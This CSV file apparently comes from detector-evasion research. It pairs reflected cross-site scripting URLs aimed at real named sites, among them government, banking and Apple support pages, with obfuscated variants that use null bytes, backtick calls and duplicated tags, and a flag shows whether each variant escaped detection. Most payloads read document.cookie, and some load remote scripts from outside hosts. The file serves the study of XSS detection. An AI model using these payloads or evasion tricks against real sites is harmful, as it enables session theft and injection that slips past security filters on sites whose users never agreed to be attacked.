Initial Payload,Initial Payload Tokenized,Mutated Payload,Mutated Payload Tokenized,Not Detected
http://www.onestopenglish.com/section.asp?sectiontype=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', '""maxwel""', ')', '</script>']]",http://www.onestopenglish.com/section.asp?sectiontype=&quot;&lt;script%00&gt;alert`&quot;maxwel&quot;`&lt;/script%00&gt;,"[['http://u', 'None', 'None']]",True
http://www.camden.gov.uk/print/ccm/content/business/small-business/languages/turkish/konsey-halesi-n<br>asl-alnr-how-to-get-a-council-contract.en?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",http://www.camden.gov.uk/print/ccm/content/business/small-business/languages/turkish/konsey-halesi-n<br%00>asl-alnr-how-to-get-a-council-contract.en?page=&quot;&lt;script%00&gt;alert`document.cookie`&lt;/script%00&gt;,"[['http://u', 'None', 'None']]",True
http://www.mainh.sante.gouv.fr/page.asp?page=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', '""maxwel""', ')', '</script>']]",http://www.mainh.sante.gouv.fr/page.asp?page=&quot;&lt;script%00&gt;alert`&quot;maxwel&quot;`&lt;%00/script&gt;,"[['http://u', 'None', 'None']]",True
http://www.metagenics.com/search.asp?zoom_query=&quot;&gt;&lt;script&gt;alert(&quot;cyber&quot;)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', '""cyber""', ')', '</script>']]",http://www.metagenics.com/search.asp?zoom_query=&quot;&lt;script%00&gt;alert`&quot;cyber&quot;`&lt;/script%00&gt;,"[['http://u', 'None', 'None']]",True
http://home.tudelft.nl/index.php?id=781&amp;q=/&quot;&gt;&lt;script&gt;alert('xss by<br>atm0n3r')&lt;/script&gt;&amp;searchradio=on&amp;option=start&amp;min=10&amp;start=0,"[['http://u', 'q=', '>', '<script>', 'alert(', ')', '</script>', 'None', 'option=', 'None', 'start=']]",http://home.tudelft.nl/index.php?id=781&amp;q=/&quot;&lt;script&lt;script&gt;top[8680439.toString`30`]`1``'xss%0D by<br%0D <br%0D atm0n3r'`&lt;/script&lt;/script&gt;&amp;searchradio=on&amp;option=start&amp;min=10&amp;start=0,"[['http://u', 'q=', 'None', 'None', 'None', 'option=', 'None', 'start=']]",True
http://uk.warranty.cars.yahoo.net/quote_page2.html?make=&quot;&gt;&lt;script&gt;alert(/nemessis-www.rstzone.org/)&lt;<br>/script&gt;,"[['http://u', '>', '<script>', 'alert(', 'None', ')', '</script>']]",http://uk.warranty.cars.yahoo.net/quote_page2.html?make=&quot;&lt;script%00&gt;alert`/nemessis-www.rstzone.org/`&lt;<br%00 /script&gt;,"[['http://u', 'None', 'None']]",True
http://www.expressorder.ru/search.php?number=%27%22%3e%3c%2ftitle%3e%3cscript%3ealert(1337)%3c%2fscr<br>ipt%3e&amp;x=30&amp;y=16,"[['http://u', '>', '</title>', '<script>', 'alert(', '0', ')', '</script>', 'x=', 'y=']]",//www.expressorder.ru/search.php?number=%27%22%3c%00%2ftitle%3c%2ftitle%00%3cscript%00%3cscript%00%3ealert`1337`%3c%2fscr<br ipt%00%3c%00%2fscr<br ipt%3e&amp;x=30&amp;y=16,"[['http://u', 'None', 'None', 'x=', 'y=']]",True
http://www.usu.ru/inform/?info=%3cscript%3ealert(%27xss%27)%3c/script%3e,"[['http://u', '<script>', 'alert(', ""'xss'"", ')', '</script>']]",http://www.usu.ru/inform/?info=%3c%00%00%00script%3ealert`%27xss%27`%3c%00/script%00%00%3e,"[['http://u', 'None', ""'xss'"", 'None']]",False
http://cardealerforums.com/car-dealer-forum-news/?threadprefix=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/sc<br>ript&gt;,"[['http://u', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",http://cardealerforums.com/car-dealer-forum-news/?threadprefix=&quot;&lt;script%00%00&gt;alert`document.cookie`;&lt;%00/sc<br%00 ript&gt;,"[['http://u', 'None', 'None']]",True
http://www.hakoach.com/shop/sr.asp?text=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', '""backdoor""', ')', '</script>']]",http://www.hakoach.com/shop/sr.asp?text=&quot;&lt;%00script&gt;alert`&quot;backdoor&quot;`&lt;/script%00&gt;,"[['http://u', 'None', 'None']]",True
http://www.republic.co.uk/bin/venda?ex=co_wizr-locayta&amp;template=wz_locayta&amp;pageno=1&amp;perpage=12&amp;colla<br>te=pdxtgndr%3abrand%3aivtype&amp;termorder=pdxtgndr%3abrand%3aivtype&amp;fieldrtype=type&amp;termtextrtype=invt&amp;<br>typertype=exact&amp;fieldpdxtgndr=pdxtgndr&amp;typepdxtgndr=exact&amp;termtextpdxtgndr=&amp;fieldbrand=brand&amp;typebra<br>nd=exact&amp;termtextbrand=&amp;fieldivtype=ivtype&amp;typeivtype=exact&amp;termtextivtype=&amp;typekeywordsearch=keywor<br>d&amp;termtextkeywordsearch=%3cscript%3ealert%28%22bl4ck%22%29%3c%2fscript%3e,"[['http://u', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', '<script>', 'alert(', 'None', ')', '</script>']]",http://www.republic.co.uk/bin/venda?ex=co_wizr-locayta&amp;template=wz_locayta&amp;pageno=1&amp;perpage=12&amp;colla<br%00>te=pdxtgndr%3abrand%3aivtype&amp;termorder=pdxtgndr%3abrand%3aivtype&amp;fieldrtype=type&amp;termtextrtype=invt&amp;<br%00>typertype=exact&amp;fieldpdxtgndr=pdxtgndr&amp;typepdxtgndr=exact&amp;termtextpdxtgndr=&amp;fieldbrand=brand&amp;typebra<br%00>nd=exact&amp;termtextbrand=&amp;fieldivtype=ivtype&amp;typeivtype=exact&amp;termtextivtype=&amp;typekeywordsearch=keywor<br%00>d&amp;termtextkeywordsearch=<script%00>/drfv/alert%28%22bl4ck%22%29%3c%00%2fscript%3e,"[['http://u', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'alert(', 'None', ')', 'None']]",True
http://www.price.ro/?action=search&amp;text=%3c/title%3e%3cscript%20src=http://crakeru.007webpro.com/xss<br>.js%3e%3c/script%3e&amp;x=0&amp;y=0,"[['http://u', 'text=', '</title>', 'None', '</script>', 'x=', 'y=']]",http://www.price.ro/?action=search&amp;text=%3c/title%00%3e%3cscript%20src=http://crakeru.007webpro.com/xss<br%00 .js%3e%3c/script%00%3e&amp;x=0&amp;y=0,"[['http://u', 'text=', 'None', 'None', 'None', 'x=', 'y=']]",True
http://blog.meebo.com/?year=%3c/title%3e%3cscript%3ealert(document.cookie);%3c/script%3e,"[['http://u', '</title>', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",http://blog.meebo.com/?year=%3c/title%3c/title%3cscript%3cscript%3ealert`document.cookie`;%3c/script%3c/script%3e,"[['http://u', 'None', 'None']]",True
http://www.beycanyacht.com/default.php?lang=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",http://www.beycanyacht.com/default.php?lang=&quot;&lt;%00script&gt;alert`document.cookie`&lt;%00/script&gt;,"[['http://u', 'None', 'None']]",True
http://serbian.wunderground.com/cgi-bin/findweather/getforecast?query=&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', '0', ')', '</script>']]",http://serbian.wunderground.com/cgi-bin/findweather/getforecast?query=&quot;&lt;%00script&gt;alert`1`&lt;/script%00&gt;,"[['http://u', 'None', 'None']]",True
http://www.flymanchester.com/flightinfo/index.php?view=&lt;script&gt;alert(document.cookie);&lt;/script&gt;,"[['http://u', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",http://www.flymanchester.com/flightinfo/index.php?view=&lt;%00script&gt;alert`document.cookie`;&lt;/script%00&gt;,"[['http://u', 'None', 'None']]",True
http://libyalinks.com/dir/s.asp?l=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', '""maxwel""', ')', '</script>']]",http://libyalinks.com/dir/s.asp?l=&quot;&lt;script%00&gt;alert`&quot;maxwel&quot;`&lt;%00/script&gt;,"[['http://u', 'None', 'None']]",True
http://web.njcu.edu/its/photogallery/reslife/login.asp?folder=&amp;n=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/s<br>cript&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,"[['http://u', 'n=', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>', '>', '<marquee>', '<h0>', '</h0>', '</marquee>']]",http://web.njcu.edu/its/photogallery/reslife/login.asp?folder=&amp;n=&quot;&lt;%00script&gt;alert`document.cookie`&lt;%00/s<br cript&gt;&lt;marquee&lt;%00h1&gt;by+narcoticxs&lt;%00/h1&lt;/marquee&gt;,"[['http://u', 'n=', 'None', 'None', 'None', 'None']]",True
http://www.persecution.com/news/index.cfm?action=fullstory&amp;newsid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/<br>script&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,"[['http://u', 'None', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>', '>', '<marquee>', '<h0>', '</h0>', '</marquee>']]",http://www.persecution.com/news/index.cfm?action=fullstory&amp;newsid=&quot;&lt;%00script&gt;alert`document.cookie`&lt;/<br script&lt;%00marquee&lt;h1&gt;by+narcoticxs&lt;/h1&lt;/marquee%00&gt;,"[['http://u', 'None', 'None', 'None', 'None']]",True
http://uploaded.to/index.php?lang=tur&amp;view=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,"[['http://u', 'view=', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",http://uploaded.to/index.php?lang=tur&amp;view=&quot;&lt;script&lt;script&gt;alert`document.cookie`&lt;/script&lt;/script&gt;,"[['http://u', 'view=', 'None', 'None']]",True
http://www.nsa.gov/applications/ia/subscriptions/iaguidancesubscriptionform.cfm?fname=&quot;&gt;&lt;body<br>onload=&quot;alert('xss - zj')&quot;&gt;,"[['http://u', '>', 'None']]",http://www.nsa.gov/applications/ia/subscriptions/iaguidancesubscriptionform.cfm?fname=&quot;&lt;body<br>onload=&quot;alert('xss - zj')&quot;&gt;,"[['http://u', 'None']]",True
http://www.keygenmusic.net/?page=team&amp;teamname=others&amp;lang='%22%3e%3c/title%3e%3cscript%3ealert(1337<br>)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,"[['http://u', 'None', 'lang=', '>', '</title>', '<script>', 'alert(', '0', ')', '</script>', '>', '<marquee>', '<h0>', '</h0>', '</marquee>']]",http://www.keygenmusic.net/?page=team&amp;teamname=others&amp;lang=%22%3c/title<script /drfv/alert`1337<script `%3c/script%3e%3cmarquee%3ch1%3exss%20by%20xylitol%3c/h1%3c/marquee%3e,"[['http://u', 'None', 'lang=', 'None', 'None', 'None']]",True
http://register.typc.doh.gov.tw/netreg/choosedep.asp?mode=%22%3e%3cframe%20src=%22javascript:alert('<br>pappy was here');%22%3e%3c/frameset%3e&amp;subseq=y,"[['http://u', '>', 'None', 'None', 'None']]",http://register.typc.doh.gov.tw/netreg/choosedep.asp?mode=%22%3cframe%20src=%22javascript:alert('<br>pappy was here');%22%3c/frameset%3e&amp;subseq=y,"[['http://u', 'None', 'None']]",True
http://nceub.commoncense.info/index.php?n=main.wikisandbox?from=%22/&gt;&lt;body onload=alert(1)&gt;,"[['http://u', 'from=', '>', '<body onload=alert(0)>']]",http://nceub.commoncense.info/index.php?n=main.wikisandbox?from=%22/&lt;%00%00body %00onload=alert(1)&gt;,"[['http://u', 'from=', 'None']]",True
https://support.apple.com/ibook_powerbook/batteryexchange/index.html?lang=de'%3e%22%3e%3cscript/src=<br>http://kusomiso.com/xss.js%3e%3c/script%3e,"[['http://u', '>', '>', '<script/src=http://kusomiso.com/xss.js>', '</script>']]",https://support.apple.com/ibook_powerbook/batteryexchange/index.html?lang=de%3e%22%3c%00%00script/src=<br>http://kusomiso.com/xss.js%3c/script%00%00%00%3e,"[['http://u', '>', 'None']]",False
http://www.julebyen.com/webcards/upload/tools/calendar.php?month=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/s<br>cript&gt;,"[['http://u', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",http://www.julebyen.com/webcards/upload/tools/calendar.php?month=&quot;&lt;%00%00script&gt;alert`document.cookie`&lt;%00/s<br %00cript&gt;,"[['http://u', 'None', 'None']]",True
https://bankingportal.sparkasse-giessen.de/banking/?konto=%22%3e%3ciframe%20src=http://www.google.de<br>%3e,"[['http://u', '>', '<iframe src=http://www.google.de>']]",https://bankingportal.sparkasse-giessen.de/banking/?konto=%22%3c%00iframe%20src=http://www.google.de<br%00 %00%3e,"[['http://u', 'None']]",True
http://openfeint.com/ios?search[order]=&amp;search[title_like]=%3cscript%3ealert%28document.cookie%29%0a<br>%3c/script%3e&amp;search[ios_is]=1&amp;commit=search,"[['http://u', '<script>', 'alert(', 'document.cookie', ')', '</script>', 'None']]",http://openfeint.com/ios?search[order]=&amp;search[title_like]=<script>/drfv/alert%28document.cookie%29%0a<br>%3c/script%3e&amp;search[ios_is]=1&amp;commit=search,"[['http://u', '<script>', 'alert(', 'document.cookie', ')', '</script>', 'None']]",False
http://www.pls48.net/gallery/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marquee&gt;&lt;h1<br>&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,"[['http://u', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>', '>', '<marquee>', '<h0>', '</h0>', '</marquee>']]",http://www.pls48.net/gallery/login.asp?folder=&quot;&lt;script%00&gt;alert`document.cookie`&lt;/script%00&gt;&lt;marquee&lt;h1<br%00 &gt;by+narcoticxs&lt;/h1&lt;%00/marquee&gt;,"[['http://u', 'None', 'None', 'None', 'None']]",True
http://www.iict.pt/docbweb/thres.asp?base=isbd&amp;searchterm=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;<br>&lt;marquee&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;,"[['http://u', 'searchterm=', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>', '>', '<marquee>', '<h0>', '</h0>', '</marquee>']]",http://www.iict.pt/docbweb/thres.asp?base=isbd&amp;searchterm=&quot;&lt;%00%00script&gt;alert`document.cookie`&lt;%00/script%00&gt;&gt;<br &lt;%00%00marquee&lt;h1%00&gt;backdoor&lt;/h1%00&lt;%00/marquee%00&gt;,"[['http://u', 'searchterm=', 'None', 'None', '>', 'None', 'None']]",False
http://smallbusinessonlinecommunity.bankofamerica.com/search.jspa?q=%27%22%3e%3ciframe+src%3d%22java<br>script%3aalert(document.cookie)%3b%22%3e%3c%2fiframe%3e%3cmarquee+bgcolor%3d%22red%22%3e%3ch1%3exss+<br>by+xylitol%3c%2fh1%3e%3c%2fm&amp;resulttypes=blog_post&amp;resulttypes=document&amp;resulttypes=message&amp;peopleen<br>abled=true&amp;daterange=all&amp;numresults=30&amp;rankby=10001,"[['http://u', '>', 'None', '</iframe>', '<marquee bgcolor=""red"">', '<h0>', '</h0>', 'None']]",http://smallbusinessonlinecommunity.bankofamerica.com/search.jspa?q=%27%22%3ciframe+src%3d%22java<br %00script%3aalert`document.cookie`%3b%22%3c%2fiframe%00%3c%00marquee+bgcolor%3d%22red%22%3ch1%00%3exss+<br by+xylitol%3c%00%2fh1%3c%2fm&amp;resulttypes=blog_post&amp;resulttypes=document&amp;resulttypes=message&amp;peopleen<br abled=true&amp;daterange=all&amp;numresults=30&amp;rankby=10001,"[['http://u', 'None', 'None', 'None', 'None', 'None', 'None', 'None']]",True
http://www.elyrics.net/inc/404.php?url=/read/b/beenie-man-lyrics/dude-lyrics.html}%3c/style%3e%3cscr<br>ipt%3ea=eval;b=alert;a(b(/xss/.source));%3c/script%3e,"[['http://u', '</style>', '<script>', 'a=', 'b=', 'a(', 'b(', '/xss/.source)', ')', '</script>']]",http://www.elyrics.net/inc/404.php?url=/read/b/beenie-man-lyrics/dude-lyrics.html}%3c/style%3cscr<br ipt%3ea=eval;b=top['al'+'ert'](1);a`b`/xss/.source``;%3c/script%3e,"[['http://u', 'None', 'a=', 'b=', 'None', 'None', '0', ')', '</script>']]",False
http://www.dha.com.tr/listele.php?t=4%22%3e%3cscript%3ealert(1)%3c/script%3e,"[['http://u', '>', '<script>', 'alert(', '0', ')', '</script>']]",http://www.dha.com.tr/listele.php?t=4%22%3cscript%00%3ealert`1`%3c/script%00%3e,"[['http://u', 'None', 'None']]",True
http://forum.vbulletinsetup.com/f4/?threadprefix=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",http://forum.vbulletinsetup.com/f4/?threadprefix=&quot;&lt;script%00&gt;alert`document.cookie`;&lt;%00/script&gt;,"[['http://u', 'None', 'None']]",True
http://www.channelnext.ca/register.php?ref=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', '0', ')', '</script>']]",http://www.channelnext.ca/register.php?ref=&quot;&lt;%00script&gt;alert`1`;&lt;%00/script&gt;,"[['http://u', 'None', 'None']]",True
http://www.incil.com/incilbbs/login.php?id=m_defteri&amp;page=1&amp;sn1=&amp;divpage=3&amp;sn=off&amp;ss=on&amp;sc=on&amp;select<br>_arrange=subject&amp;desc=desc&amp;s_url=%2fincilbbs%2fzboard.php%3fid%3dm_defteri%26page%3d1%26sn1%3d%26div<br>page%3d3%26sn%3doff%26ss%3don%26sc%3don%26select_arrange%3dsubject%26desc%3ddesc%26no%3d%5c%22%3e%3c<br>script%3ealert%28document.cookie%29%3c%2fscript%3e%3e%3cmarquee%3e%3ch1%3ebackdoor%3c%2fh1%3e%3c%2fm<br>arquee%3e,"[['http://u', 'page=', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'id=', 'page=', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'no=', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>', '>', '<marquee>', '<h0>', '</h0>', '</marquee>']]",http://www.incil.com/incilbbs/login.php?id=m_defteri&amp;page=1&amp;sn1=&amp;divpage=3&amp;sn=off&amp;ss=on&amp;sc=on&amp;select<br <br _arrange=subject&amp;desc=desc&amp;s_url=%2fincilbbs%2fzboard.php%3fid%3dm_defteri%26page%3d1%26sn1%3d%26div<br <br page%3d3%26sn%3doff%26ss%3don%26sc%3don%26select_arrange%3dsubject%26desc%3ddesc%26no%3d%5c%22%3c<br script%3e%3c<br script%3etop[/al/.source+/ert/.source/]`1`%28document.cookie%29%3c%2fscript%3e%3c%2fscript%3e%3cmarquee%3ch1%3e%3cmarquee%3ch1%3ebackdoor%3c%2fh1%3c%2fm<br arquee%3e%3c%2fh1%3c%2fm<br arquee%3e,"[['http://u', 'page=', 'None', 'None', 'None', 'None', 'None', 'None', 'None', 'document.cookie', ')', '</script>', '</script>', 'None', 'None', 'None', 'None']]",False
http://www.xinpu.gov.cn/product.asp?bigclassname=%3cscript%3ealert(%22xss%22)%3c/script%3e,"[['http://u', '<script>', 'alert(', '""xss""', ')', '</script>']]",http://www.xinpu.gov.cn/product.asp?bigclassname=%3c%00script%3ealert`%22xss%22`%3c/script%00%3e,"[['http://u', 'None', 'None']]",True
http://www.ezopera.net/opera/bbs.cgi?mode=change&amp;no=6635'%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%<br>20kusomiso.com%22)%3c/script%3e,"[['http://u', 'no=', '>', '>', '>', '<script>', 'alert(', ')', '</script>']]",http://www.ezopera.net/opera/bbs.cgi?mode=change&amp;no=6635%3e%22%3c%00script%3ealert`%22xss%20by%<br 20kusomiso.com%22`%3c%00/script%3e,"[['http://u', 'no=', '>', 'None', 'None']]",False
http://www.yzghj.gov.cn/lxtd.asp?id=%22%3e%3cscript%3ealert%28/ar3sw0rmed/%29;%3c/script%3e,"[['http://u', '>', '<script>', 'alert(', '/ar0sw0rmed/', ')', '</script>']]",http://www.yzghj.gov.cn/lxtd.asp?id=%22%3c%00script%00%3ealert%28/ar3sw0rmed/%29;%3c%00/script%00%3e,"[['http://u', 'None', 'alert(', '/ar0sw0rmed/', ')', 'None']]",False
"http://www.shortnews.de/visitenkarte.cfm?username=http://github.com/tpinto/coordinate/search?q=%22%3<br>e%3cscript%3ealert(string.fromcharcode(107,%2073,%20110,%2071,%20111,%2070,%2099,%2072,%2097,%2079,%<br>20115,%2032,%20105,%2083,%2032,%20100,%2065,%2032,%2098,%20101,%2083,%20116,%2032,%2070,%20117,%2099<br>,%2075,%2032,%2084,%20104,%20101,%2032,%2082,%20101,%20115,%2084,%2033,%2033,%2033));%3c/script%3e%3<br>c!--","[['http://u', 'None', 'q=', '>', '<script>', 'alert(', 'string.fromcharcode(', ')', ')', '</script>', '<!--']]","http://www.shortnews.de/visitenkarte.cfm?username=http://github.com/tpinto/coordinate/search?q=%22%3<br e%3cscript%3ealert(string.fromcharcode(107,%2073,%20110,%2071,%20111,%2070,%2099,%2072,%2097,%2079,%<br 20115,%2032,%20105,%2083,%2032,%20100,%2065,%2032,%2098,%20101,%2083,%20116,%2032,%2070,%20117,%2099<br ,%2075,%2032,%2084,%20104,%20101,%2032,%2082,%20101,%20115,%2084,%2033,%2033,%2033));%3c/script%3e%3<br c!--","[['http://u', 'None', 'q=', 'None', 'alert(', 'string.fromcharcode(', 'None', 'None']]",True
http://www.leadershipdevelopment.co.uk/gallery/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/scri<br>pt&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,"[['http://u', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>', '>', '<marquee>', '<h0>', '</h0>', '</marquee>']]",http://www.leadershipdevelopment.co.uk/gallery/igallery.asp?d=&quot;&lt;script%00&gt;alert`document.cookie`&lt;/scri<br%00>pt&lt;marquee&lt;h1%00&gt;by%20narcoticxs&lt;/h1&lt;/marquee%00&gt;,"[['http://u', 'None', 'None', 'None', 'None']]",True
http://www.news-medical.net/?keyword=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', '""maxwel""', ')', '</script>']]",http://www.news-medical.net/?keyword=&quot;&lt;%00script&gt;alert`&quot;maxwel&quot;`&lt;/script%00&gt;,"[['http://u', 'None', 'None']]",True
http://www.ozarelektronik.com/shop/default.asp?gb=urun&amp;id=293&amp;ortak=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/scr<br>ipt&gt;,"[['http://u', 'id=', 'ortak=', '>', '<script>', 'alert(', '""backdoor""', ')', '</script>']]",http://www.ozarelektronik.com/shop/default.asp?gb=urun&amp;id=293&amp;ortak=&quot;&lt;%00script&gt;alert`&quot;backdoor&quot;`&lt;/scr<br%00 ipt&gt;,"[['http://u', 'id=', 'ortak=', 'None', 'None']]",True
http://www.landofknights.com/register.php?ref=1'&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', 'document.cookie', ')', '</script>']]",http://www.landofknights.com/register.php?ref=1'&lt;script%00&gt;alert`document.cookie`;&lt;/script%00&gt;,"[['http://u', 'None', 'None']]",True
http://www.curezone.com/faq/c.asp?a=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/script%3e,"[['http://u', '>', '<script>', 'alert(', '""maxwel""', ')', '</script>']]",http://www.curezone.com/faq/c.asp?a=%22%3c%00script%3ealert`%22maxwel%22`%3c/script%00%3e,"[['http://u', 'None', 'None']]",True
http://cgi.toshinari.net/support/test/search.cgi?keyword=&amp;start=1&amp;to=20&amp;bbs=%22%3e%27%3e%3cscript%3e<br>alert%28%22xss%22%29%3c%2fscript%3e,"[['http://u', 'start=', 'None', 'None', '>', '>', '<script>', 'alert(', '""xss""', ')', '</script>']]",http://cgi.toshinari.net/support/test/search.cgi?keyword=&amp;start=1&amp;to=20&amp;bbs=%22%3e%27%3cscript%00%3e<br alert%28%22xss%22%29%3c%2fscript%00%3e,"[['http://u', 'start=', 'None', 'None', '>', 'None', 'None']]",False
http://www.radiohaus.com.br/busca.php?cat=0&amp;keyword=%3cscript%3ealert%28%22fzero+rules+%3b%29%22%29%<br>3c%2fscript%3e,"[['http://u', 'keyword=', '<script>', 'alert(', ')', ')', '</script>']]",http://www.radiohaus.com.br/busca.php?cat=0&amp;keyword=<script>/drfv/<script>/drfv/<script>/drfv/<script>/drfv/<script>/drfv/<script>/drfv/<script>/drfv/<script>/drfv/alert%28%22fzero+rules+%3b%29%22%29%<br><br><br><br><br><br><br><br>3c%2fscript%3e,"[['http://u', 'keyword=', '<script>', '<script>', '<script>', '<script>', '<script>', '<script>', '<script>', '<script>', 'alert(', ')', ')', '</script>']]",False
http://www.airshow.sp.mil.pl/index2.php?option=com_content&amp;user_rating=1&amp;submit_vote=%e8%a9%95%e4%be<br>%a1&amp;task=vote&amp;pop=0&amp;itemid=10&amp;cid=1&amp;url=%0acontent-type:%16text/html%0acontent-length:13%0a%0ayou%20<br>are%20xssed%20,"[['http://u', 'user_rating=', 'submit_vote=', 'task=', 'pop=', 'itemid=', 'cid=', 'url=', 'type:', 'length:']]",http://www.airshow.sp.mil.pl/index2.php?option=com_content&amp;user_rating=1&amp;submit_vote=%e8%a9%95%e4%be<br>%a1&amp;task=vote&amp;pop=0&amp;itemid=10&amp;cid=1&amp;url=%0acontent-type:%16text/html%0acontent-length:13%0a%0ayou%20<br>are%20xssed%20,"[['http://u', 'user_rating=', 'submit_vote=', 'task=', 'pop=', 'itemid=', 'cid=', 'url=', 'type:', 'length:']]",True
http://zakonsmoka.pl/register.php?ref=&quot;&gt;&lt;script&gt;alert(1);&lt;/script&gt;,"[['http://u', '>', '<script>', 'alert(', '0', ')', '</script>']]",http://zakonsmoka.pl/register.php?ref=&quot;&lt;%00script%00&gt;alert`1`;&lt;/script%00%00&gt;,"[['http://u', 'None', 'None']]",True
http://www.kcskspip.gov.pl/harmonogram/index/pl?grupa=%3e%22%3e%3cscript%20%0a%0d%3ealert(document.d<br>omain)%3b%3c/script%3e,"[['http://u', '>', '>', '<script \n\r>', 'alert(', 'None', ')', '</script>']]",http://www.kcskspip.gov.pl/harmonogram/index/pl?grupa=%3e%22%3cscript%20%0a%0d%3ealert`document.d<br>omain`%3b%3c/script%3e,"[['http://u', '>', '<script \n\r>', '</script>']]",False
"http://sb.hsbc.fr/cours/at/?c=%22%27%2f%3e%3cimg+src%3d.+onerror%3dalert(string.fromcharcode(88,115,<br>115,101,100,32,98,121,32,80,105,101,114,114,101,32,71,97,114,100,101,110,97,116))+%3e","[['http://u', '>', 'None']]","http://sb.hsbc.fr/cours/at/?c=%22%27%2f%3cimg+src%3d.+onerror%3dalert(string.fromcharcode(88,115,<br>115,101,100,32,98,121,32,80,105,101,114,114,101,32,71,97,114,100,101,110,97,116))+%3e","[['http://u', 'None']]",True
